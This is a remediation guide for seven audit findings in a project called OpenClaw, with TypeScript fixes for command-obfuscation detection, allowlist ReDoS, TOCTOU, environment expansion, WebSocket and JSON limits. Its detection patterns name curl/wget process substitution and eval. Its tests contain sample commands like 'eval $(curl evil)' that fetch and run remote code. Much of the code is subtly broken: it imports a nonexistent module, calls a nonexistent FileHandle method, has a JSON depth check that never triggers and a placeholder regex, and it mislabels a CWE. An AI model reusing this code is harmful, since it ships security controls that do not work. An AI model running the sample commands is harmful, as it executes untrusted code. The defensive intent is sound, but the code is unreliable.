# OpenClaw Security Vulnerability Remediation Guide

This document contains detailed remediation recommendations for the security vulnerabilities discovered during the audit.

---

## VULN-1: Command Obfuscation Detection Bypass

### Vulnerability Summary
The current obfuscation detection in `src/infra/exec-obfuscation-detect.ts` can be bypassed using:
1. Zero-width Unicode characters
2. Unicode normalization attacks
3. Variable indirection
4. Arithmetic expansion
5. Shell built-in aliases

### Recommended Fix

Create a new file `src/infra/exec-obfuscation-detect-v2.ts`:

```typescript
/**
 * Enhanced command obfuscation detection with Unicode normalization
 * and additional bypass detection patterns.
 */

import { normalize as normalizeUnicode } from "node:unicode-normalize";

const MAX_COMMAND_LENGTH = 100_000;
const MAX_NESTED_DEPTH = 10;

// Original patterns remain
const OBFUSCATION_PATTERNS = [
  // ... existing patterns ...
];

// NEW: Unicode obfuscation patterns
const UNICODE_OBFUSCATION_PATTERNS = [
  {
    id: "unicode-zero-width",
    description: "Zero-width character obfuscation",
    regex: /[\u200B-\u200D\u2060\uFEFF]/, // Zero-width chars
  },
  {
    id: "unicode-combining",
    description: "Excessive combining diacritical marks",
    regex: /[\u0300-\u036F]{3,}/, // 3+ combining marks
  },
  {
    id: "unicode-lookalike",
    description: "Cyrillic/Greek lookalike characters in command context",
    regex: /(?:[а-яА-ЯёЁα-ωΑ-Ω][a-zA-Z]|[a-zA-Z][а-яА-ЯёЁα-ωΑ-Ω])[a-zA-Zа-яА-ЯёЁα-ωΑ-Ω]*/,
  },
  {
    id: "unicode-bidi",
    description: "Bidirectional text override characters",
    regex: /[\u202A-\u202E\u2066-\u2069]/,
  },
];

// NEW: Variable indirection patterns
const VARIABLE_INDIRECTION_PATTERNS = [
  {
    id: "var-indirect-indirect",
    description: "Bash indirect expansion ${!var}",
    regex: /\$\{!+[a-zA-Z_]\w*\}/,
  },
  {
    id: "var-indiret-printf",
    description: "Printf with octal escapes",
    regex: /printf\s+['"]?(?:\\[0-7]{3}){5,}/,
  },
  {
    id: "var-indirection-set",
    description: "Set builtin for indirection",
    regex: /set\s+--\s+[a-zA-Z_]\w*(?:\s+[a-zA-Z_]\w*)+;\s*\$@/,
  },
];

// NEW: Arithmetic expansion patterns
const ARITHMETIC_EXPANSION_PATTERNS = [
  {
    id: "arith-expansion-nested",
    description: "Nested arithmetic expansion",
    regex: /\$\{?\(\(.*\$\{?\(?\(/,
  },
  {
    id: "arith-expansion-command",
    description: "Command substitution in arithmetic context",
    regex: /\$\{?\(\(.*\$\(.*\).*\)\)?\}?/,
  },
];

// NEW: Shell built-in obfuscation
const BUILTIN_OBFUSCATION_PATTERNS = [
  {
    id: "builtin-command",
    description: "Command builtin with eval",
    regex: /command\s+(?:eval|exec)\b/,
  },
  {
    id: "builtin-builtin",
    description: "Builtin with eval",
    regex: /builtin\s+eval\b/,
  },
  {
    id: "alias-definition",
    description: "Alias definition with dangerous commands",
    regex: /alias\s+[a-zA-Z_]\w*=(?:['"]?)(?:eval|exec|bash|sh)\b/,
  },
  {
    id: "function-obfuscation",
    description: "Function definition with eval",
    regex: /[a-zA-Z_]\w*\(\)\s*\{\s*(?:eval|exec)\b/,
  },
];

// NEW: Advanced shell features
const ADVANCED_SHELL_PATTERNS = [
  {
    id: "process-substitution",
    description: "Process substitution",
    regex: /<(?:\(|\(.*curl|\(.*wget)/,
  },
  {
    id: "command-grouping",
    description: "Command grouping with eval",
    regex: /\{[^}]*eval|\(.*eval.*\)/,
  },
  {
    id: "heredoc-inline",
    description: "Inline heredoc",
    regex: /<<[-~]?\s*['"]?[a-zA-Z_][\w-]*['"]?/,
  },
];

function normalizeCommand(command: string): {
  normalized: string;
  hasUnicodeIssues: boolean;
} {
  let normalized = command;
  const hasUnicodeIssues: string[] = [];

  // Remove zero-width characters
  if (/[\u200B-\u200D\u2060\uFEFF]/.test(normalized)) {
    hasUnicodeIssues.push("zero-width");
    normalized = normalized.replace(/[\u200B-\u200D\u2060\uFEFF]/g, "");
  }

  // Normalize Unicode (NFC)
  const preNormalize = normalized;
  normalized = normalizeUnicode(normalized, "NFC");
  if (preNormalize !== normalized) {
    hasUnicodeIssues.push("normalization");
  }

  // Detect combining marks
  if (/[\u0300-\u036F]{3,}/.test(normalized)) {
    hasUnicodeIssues.push("excessive-combining");
  }

  // Detect bidi overrides
  if (/[\u202A-\u202E\u2066-\u2069]/.test(normalized)) {
    hasUnicodeIssues.push("bidi-override");
    normalized = normalized.replace(/[\u202A-\u202E\u2066-\u2069]/g, "");
  }

  return {
    normalized,
    hasUnicodeIssues: hasUnicodeIssues.length > 0,
  };
}

function checkLengthLimits(command: string): { valid: boolean; reason?: string } {
  if (command.length > MAX_COMMAND_LENGTH) {
    return { valid: false, reason: `command exceeds ${MAX_COMMAND_LENGTH} characters` };
  }
  return { valid: true };
}

function checkControlCharacters(command: string): { valid: boolean; reason?: string } {
  // Check for suspicious control characters
  const suspicious = /[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/.test(command);
  if (suspicious) {
    return { valid: false, reason: "suspicious control characters detected" };
  }

  // Check for excessive tab/newline (potential obfuscation)
  const newlines = (command.match(/\n/g) ?? []).length;
  const tabs = (command.match(/\t/g) ?? []).length;
  if (newlines > 10 || tabs > 20) {
    return { valid: false, reason: "excessive whitespace (possible obfuscation)" };
  }

  return { valid: true };
}

export function detectCommandObfuscationV2(command: string): ObfuscationDetection {
  if (!command || !command.trim()) {
    return { detected: false, reasons: [], matchedPatterns: [] };
  }

  // Check length limits first
  const lengthCheck = checkLengthLimits(command);
  if (!lengthCheck.valid) {
    return {
      detected: true,
      reasons: [lengthCheck.reason ?? "command too long"],
      matchedPatterns: ["length-limit"],
    };
  }

  // Check control characters
  const controlCheck = checkControlCharacters(command);
  if (!controlCheck.valid) {
    return {
      detected: true,
      reasons: [controlCheck.reason ?? "control characters"],
      matchedPatterns: ["control-chars"],
    };
  }

  // Normalize Unicode and detect issues
  const { normalized, hasUnicodeIssues } = normalizeCommand(command);

  const reasons: string[] = [];
  const matchedPatterns: string[] = [];

  // Run original patterns on normalized command
  for (const pattern of OBFUSCATION_PATTERNS) {
    if (pattern.regex.test(normalized)) {
      // ... existing suppression logic ...
      matchedPatterns.push(pattern.id);
      reasons.push(pattern.description);
    }
  }

  // NEW: Check Unicode obfuscation
  if (hasUnicodeIssues) {
    matchedPatterns.push("unicode-obfuscation");
    reasons.push("Unicode obfuscation detected");
  }

  // NEW: Check Unicode patterns
  for (const pattern of UNICODE_OBFUSCATION_PATTERNS) {
    if (pattern.regex.test(normalized)) {
      matchedPatterns.push(pattern.id);
      reasons.push(pattern.description);
    }
  }

  // NEW: Check variable indirection
  for (const pattern of VARIABLE_INDIRECTION_PATTERNS) {
    if (pattern.regex.test(normalized)) {
      matchedPatterns.push(pattern.id);
      reasons.push(pattern.description);
    }
  }

  // NEW: Check arithmetic expansion
  for (const pattern of ARITHMETIC_EXPANSION_PATTERNS) {
    if (pattern.regex.test(normalized)) {
      matchedPatterns.push(pattern.id);
      reasons.push(pattern.description);
    }
  }

  // NEW: Check builtin obfuscation
  for (const pattern of BUILTIN_OBFUSCATION_PATTERNS) {
    if (pattern.regex.test(normalized)) {
      matchedPatterns.push(pattern.id);
      reasons.push(pattern.description);
    }
  }

  // NEW: Check advanced shell features
  for (const pattern of ADVANCED_SHELL_PATTERNS) {
    if (pattern.regex.test(normalized)) {
      matchedPatterns.push(pattern.id);
      reasons.push(pattern.description);
    }
  }

  return {
    detected: matchedPatterns.length > 0,
    reasons,
    matchedPatterns,
  };
}
```

### Usage
Replace imports to use the new detection function:
```typescript
import { detectCommandObfuscationV2 as detectCommandObfuscation } from "./exec-obfuscation-detect-v2.js";
```

---

## VULN-2: Allowlist Regex Injection

### Recommended Fix

Create `src/infra/exec-allowlist-pattern-v2.ts`:

```typescript
/**
 * Safe glob pattern matching with ReDoS protection
 */

const GLOB_REGEX_CACHE_LIMIT = 512;
const MAX_PATTERN_LENGTH = 1000;
const MAX_PATTERN_STARS = 10;

// Validate pattern before compilation
function validateGlobPattern(pattern: string): { valid: boolean; reason?: string } {
  if (pattern.length > MAX_PATTERN_LENGTH) {
    return { valid: false, reason: "pattern too long" };
  }

  // Count wildcards (ReDoS protection)
  const starCount = (pattern.match(/\*/g) ?? []).length;
  if (starCount > MAX_PATTERN_STARS) {
    return { valid: false, reason: "too many wildcards" };
  }

  // Check for ReDoS patterns
  const redosPatterns = [
    /\([^)]*\*[^)]*\*[^)]*\)/, // Nested stars in group
    /(\*|\+|\{)\{[^}]*\*[^}]*\}[^}]*\}/, // Nested quantifiers
    /\*{10,}/, // 10+ consecutive stars
    /\[.*\*.*\*.*\]/, // Multiple stars in char class
  ];

  for (const redos of redosPatterns) {
    if (redos.test(pattern)) {
      return { valid: false, reason: "potential ReDoS pattern" };
    }
  }

  // Only allow safe characters in patterns
  const allowedPattern = /^[\w\s.\/\-_*?[\]{}]+$/;
  if (!allowedPattern.test(pattern)) {
    return { valid: false, reason: "invalid characters in pattern" };
  }

  return { valid: true };
}

function compileSafeGlobRegex(pattern: string): RegExp | null {
  // Validate first
  const validation = validateGlobPattern(pattern);
  if (!validation.valid) {
    throw new Error(`Invalid glob pattern: ${validation.reason}`);
  }

  // ... existing compilation logic ...
  // Add timeout protection
  const regex = new RegExp("...", "i"); // as before

  return regex;
}

export function matchesExecAllowlistPatternV2(
  pattern: string,
  target: string
): boolean {
  const trimmed = pattern.trim();
  if (!trimmed) {
    return false;
  }

  try {
    // Validate before compilation
    const validation = validateGlobPattern(trimmed);
    if (!validation.valid) {
      return false; // Reject invalid patterns
    }

    // ... rest of existing logic ...
  } catch (e) {
    return false;
  }
}
```

---

## VULN-3: TOCTOU Race Condition

### Recommended Fix

The Time-of-Check-Time-Use vulnerability requires atomic operations. Create `src/infra/exec-atomic.ts`:

```typescript
import { open } from "node:fs/promises";
import { constants } from "node:fs";

/**
 * Atomic file validation and execution using file descriptors
 */
export async function validateAndOpenExecutable(params: {
  path: string;
  allowedPaths: Set<string>;
}): Promise<{ fd: number; actualPath: string } | null> {
  const { path, allowedPaths } = params;

  // Step 1: Open with O_NOFOLLOW to prevent symlink races
  const fd = await open(path, constants.O_RDONLY | constants.O_NOFOLLOW);

  try {
    // Step 2: Get actual file information from fd (not path)
    const stats = await fd.stat();

    // Step 3: Verify it's a regular file
    if (!stats.isFile()) {
      await fd.close();
      return null;
    }

    // Step 4: Get real path from fd (/proc/self/fd/{fd})
    const realPath = await fd.realpath();

    // Step 5: Verify against allowlist
    if (!allowedPaths.has(realPath)) {
      await fd.close();
      return null;
    }

    // Step 6: Verify file hasn't been modified (optional)
    // Store the inode/dev and verify before execution

    return { fd: fd.fd, actualPath: realPath };
  } catch (e) {
    await fd.close();
    return null;
  }
}

/**
 * Execute with file descriptor (not path) to prevent TOCTOU
 */
export async function executeWithFd(params: {
  fd: number;
  args: string[];
}): Promise<void> {
  const { fd, args } = params;

  // On Linux, can use /proc/self/fd/{fd} as executable path
  // This ensures the exact inode is executed
  const fdPath = `/proc/self/fd/${fd}`;

  // Execute using fdPath instead of original path
  // ... implementation depends on spawn API ...
}
```

---

## VULN-4: Environment Variable Injection

### Recommended Fix

Update `src/config/env-substitution.ts`:

```typescript
const MAX_ENV_VAR_LENGTH = 8_192; // 8KB limit per variable
const MAX_EXPANSION_DEPTH = 5;
const MAX_TOTAL_EXPANSION_SIZE = 100_000; // 100KB total

type SubstitutionContext = {
  depth: number;
  totalSize: number;
};

function substituteString(
  value: string,
  env: NodeJS.ProcessEnv,
  configPath: string,
  opts?: SubstituteOptions,
  ctx?: SubstitutionContext
): string {
  if (!value.includes("$")) {
    return value;
  }

  const depth = ctx?.depth ?? 0;
  const totalSize = ctx?.totalSize ?? 0;

  // NEW: Check expansion depth
  if (depth > MAX_EXPANSION_DEPTH) {
    throw new Error(
      `Environment variable expansion depth exceeds ${MAX_EXPANSION_DEPTH} at ${configPath}`
    );
  }

  // NEW: Check total expansion size
  if (totalSize > MAX_TOTAL_EXPANSION_SIZE) {
    throw new Error(
      `Environment variable expansion size exceeds ${MAX_TOTAL_EXPANSION_SIZE} bytes at ${configPath}`
    );
  }

  const chunks: string[] = [];
  let currentSize = 0;

  for (let i = 0; i < value.length; i += 1) {
    const char = value[i];
    if (char !== "$") {
      chunks.push(char);
      currentSize += 1;
      continue;
    }

    const token = parseEnvTokenAt(value, i);
    if (token?.kind === "substitution") {
      const envValue = env[token.name];

      if (envValue === undefined || envValue === "") {
        if (opts?.onMissing) {
          opts.onMissing({ varName: token.name, configPath });
          chunks.push(`\${${token.name}}`);
          i = token.end;
          continue;
        }
        throw new MissingEnvVarError(token.name, configPath);
      }

      // NEW: Check individual env var size
      if (envValue.length > MAX_ENV_VAR_LENGTH) {
        throw new Error(
          `Environment variable ${token.name} exceeds ${MAX_ENV_VAR_LENGTH} bytes`
        );
      }

      // NEW: Recurse with updated context
      const expanded = substituteString(
        envValue,
        env,
        `${configPath}.${token.name}`,
        opts,
        { depth: depth + 1, totalSize: currentSize + envValue.length }
      );

      chunks.push(expanded);
      currentSize += expanded.length;
      i = token.end;
      continue;
    }

    // ... rest of existing logic ...
  }

  return chunks.join("");
}
```

---

## VULN-5: WebSocket Message Limits

### Recommended Fix

Update `src/gateway/server/ws-connection.ts`:

```typescript
const WS_MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10MB
const WS_MAX_MESSAGE_RATE = 100; // messages per second
const WS_MESSAGE_RATE_WINDOW_MS = 1000;

type WsMessageTracker = {
  messages: number[];
  bytesReceived: number;
};

const messageTrackers = new Map<WebSocket, WsMessageTracker>();

function checkMessageLimits(
  socket: WebSocket,
  dataSize: number
): { allowed: boolean; reason?: string } {
  const tracker = messageTrackers.get(socket) ?? {
    messages: [],
    bytesReceived: 0,
  };

  // Check message size
  if (dataSize > WS_MAX_MESSAGE_SIZE) {
    return {
      allowed: false,
      reason: `message size ${dataSize} exceeds ${WS_MAX_MESSAGE_SIZE}`,
    };
  }

  // Check rate limit
  const now = Date.now();
  tracker.messages = tracker.messages.filter(t => now - t < WS_MESSAGE_RATE_WINDOW_MS);
  tracker.messages.push(now);

  if (tracker.messages.length > WS_MAX_MESSAGE_RATE) {
    return {
      allowed: false,
      reason: `rate limit exceeded: ${tracker.messages.length} messages/sec`,
    };
  }

  // Check total bytes per connection
  tracker.bytesReceived += dataSize;
  if (tracker.bytesReceived > 500 * 1024 * 1024) { // 500MB per connection
    return {
      allowed: false,
      reason: "connection byte limit exceeded",
    };
  }

  messageTrackers.set(socket, tracker);
  return { allowed: true };
}

// In the WebSocket handler:
socket.on("message", (data, isBinary) => {
  const size = isBinary ? (data as Buffer).length : (data as string).length;

  const limitCheck = checkMessageLimits(socket, size);
  if (!limitCheck.allowed) {
    logWsControl.warn(`Message limit exceeded: ${limitCheck.reason}`);
    close(1008, limitCheck.reason); // Policy violation
    return;
  }

  // ... process message ...
});

socket.on("close", () => {
  messageTrackers.delete(socket);
});
```

---

## VULN-6: JSON Parsing DoS

### Recommended Fix

Create `src/infra/safe-json-parse.ts`:

```typescript
const MAX_JSON_DEPTH = 100;
const MAX_JSON_SIZE = 10 * 1024 * 1024; // 10MB
const MAX_JSON_KEYS = 10_000;

export function safeJsonParse(text: string): unknown {
  // Check size first
  if (text.length > MAX_JSON_SIZE) {
    throw new Error(`JSON size exceeds ${MAX_JSON_SIZE} bytes`);
  }

  let depth = 0;
  let keyCount = 0;

  return JSON.parse(text, (key, value) => {
    // Track depth (this is called depth-first, so increment on entry)
    depth++;
    if (depth > MAX_JSON_DEPTH) {
      throw new Error(`JSON depth exceeds ${MAX_JSON_DEPTH}`);
    }

    // Track keys
    if (typeof key === "string") {
      keyCount++;
      if (keyCount > MAX_JSON_KEYS) {
        throw new Error(`JSON key count exceeds ${MAX_JSON_KEYS}`);
      }
    }

    // Decrement depth when exiting object/array
    const result = value;
    depth--;

    return result;
  });
}

// Alternative: Use a streaming parser for large JSON
export async function safeJsonParseStream(
  stream: ReadableStream,
  maxSize: number = MAX_JSON_SIZE
): Promise<unknown> {
  // Use a streaming JSON parser like:
  // - https://www.npmjs.com/package/stream-json
  // - https://www.npmjs.com/package/oboe
  throw new Error("Streaming parser not implemented");
}
```

---

## VULN-7: Command Argument Parsing Bypass

### Recommended Fix

Update `src/infra/exec-safe-bin-policy-validator.ts`:

```typescript
import path from "node:path";

function isPathLikeToken(value: string): boolean {
  const trimmed = value.trim();
  if (!trimmed) {
    return false;
  }
  if (trimmed === "-") {
    return false;
  }

  // NEW: Normalize path first
  let normalized: string;
  try {
    normalized = path.normalize(trimmed);
  } catch {
    // Invalid path, treat as path-like (unsafe)
    return true;
  }

  // Check for path-like patterns
  if (normalized.startsWith("./") || normalized.startsWith("../") || normalized.startsWith("~")) {
    return true;
  }
  if (normalized.startsWith("/")) {
    return true;
  }
  if (/^[A-Za-z]:[\\/]/.test(normalized)) {
    return true;
  }

  // NEW: Check for double slashes or other suspicious patterns
  if (normalized.includes("//")) {
    return true;
  }

  // NEW: Check if normalized path differs from input (suspicious)
  if (normalized !== trimmed) {
    // May contain . or .. components
    const parts = trimmed.split(/[\\/]/);
    for (const part of parts) {
      if (part === "." || part === ".." || part === "") {
        return true;
      }
    }
  }

  return false;
}
```

---

## Testing Strategy

### Unit Tests
For each fix, add comprehensive tests:

```typescript
describe("VULN-1 Fix: Unicode Obfuscation Detection", () => {
  it("should detect zero-width characters", () => {
    const cmd = "e\u200Bv\u200Ba\u200Bl $(curl evil)";
    expect(detectCommandObfuscationV2(cmd).detected).toBe(true);
  });

  it("should detect variable indirection", () => {
    const cmd = 'cmd="eval";${cmd} $(curl evil)';
    expect(detectCommandObfuscationV2(cmd).detected).toBe(true);
  });

  it("should reject oversized commands", () => {
    const cmd = "a".repeat(100_001);
    expect(detectCommandObfuscationV2(cmd).detected).toBe(true);
  });
});
```

### Integration Tests
Create end-to-end tests that simulate actual attack scenarios.

### Fuzz Testing
Consider using a fuzzer like:
- https://github.com/google/fuzztest
- https://github.com/llvm/llvm-project/tree/main/compiler-rt/lib/fuzzer

---

## Deployment Checklist

- [ ] Review all PoC tests
- [ ] Implement fixes
- [ ] Run all security tests
- [ ] Add to CI/CD pipeline
- [ ] Document new security controls
- [ ] Update SECURITY.md
- [ ] Release with security notes

---

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- CWE-77: Command Injection
- CWE-416: Use After Free (similar to TOCTOU)
- Unicode Security: https://unicode.org/reports/tr36/
